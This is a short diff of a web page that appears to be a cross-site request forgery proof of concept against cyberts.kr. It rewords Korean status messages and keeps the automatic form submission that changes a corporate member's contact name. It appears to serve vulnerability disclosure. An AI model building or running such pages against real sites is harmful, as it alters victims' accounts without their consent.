@@ -308,13 +308,12 @@ ncnm=%EC%A0%84%EC%9C%A0%EC%A7%84</div>
             formName.value = name;
 
             status.className = 'status show success';
-            status.innerHTML = '✅ CSRF 공격이 전송됩니다!<br><br>' +
+            status.innerHTML = '✅ CSRF 공격이 전송되었습니다!<br><br>' +
                               '<strong>다음 단계:</strong><br>' +
-                              '1. cyberts.kr 기업회원 마이페이지로 리다이렉트됩니다<br>' +
-                              '2. 담당자명이 "' + name + '"으로 변경되었는지 확인하세요<br>' +
+                              '1. cyberts.kr 기업회원 마이페이지로 이동<br>' +
+                              '2. 담당자명이 "' + name + '"으로 변경되었는지 확인<br>' +
                               '3. 변경되었다면 CSRF 취약점 증명 완료!';
 
-            // form submit (페이지가 cyberts.kr로 리다이렉트됨)
             form.submit();
         }
 
